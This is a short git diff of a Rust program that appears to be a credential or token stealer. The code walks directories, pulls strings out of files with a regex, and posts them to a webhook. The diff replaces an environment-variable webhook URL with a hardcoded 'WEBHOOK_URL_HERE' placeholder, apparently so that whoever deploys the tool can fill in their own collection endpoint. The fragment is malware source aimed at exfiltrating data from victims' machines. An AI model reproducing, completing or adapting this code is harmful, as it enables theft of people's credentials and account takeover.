@@ -3,7 +3,6 @@ extern crate dirs;
 mod utils;
 
 use regex::Regex;
-use std::env;
 use utils::{fs::*, webhook::*};
 
 #[cfg(target_os = "mac_os")] // Macdonald's users :)
@@ -79,10 +78,8 @@ fn extract(data: &String) -> Option<String> {
     None
 }
 
-fn main() {
-    dotenv::dotenv().ok();
-    
-    let webhook = Webhook::new(env::var("WEBHOOK_URL").unwrap());
+fn main() {    
+    let webhook = Webhook::new("WEBHOOK_URL_HERE".to_string());
 
     for path in paths() {
         for path in FS::dir(&path) {
